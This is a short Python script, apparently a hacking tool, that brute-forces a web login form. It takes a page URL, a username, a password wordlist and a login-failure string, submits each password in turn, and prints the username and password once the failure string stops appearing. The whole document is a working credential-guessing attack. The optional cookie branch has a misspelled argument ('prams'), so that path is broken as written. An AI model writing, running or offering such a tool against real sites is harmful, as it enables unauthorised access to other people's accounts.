import requests
url = input('[+] Enter Page Url: ')
username= input('[+] Enter Username to Bruteforce: ')
pwd_file= input('[+] Enter Password file: ')
login_failed=input('[+] Enter String that occurs when login failed: ')
cookie_value=input('[+] Enter Cookie if you have: ')
def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print("Trying: "+password)
        data = {'username':username,'password':password,'Login':'submit'}
        if cookie_value != '':
            response = requests.get(url, prams={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
        else:
            response= requests.post(url,data=data)
        if login_failed in response.content.decode():
            pass
        else:
            print('[+] Found Username: ==> '+ username)
            print('[+] Found Password: ==> '+ password)
            exit()
with open(pwd_file,'r') as passwords:
    cracking(username,url)
print('[!!] Password not in list')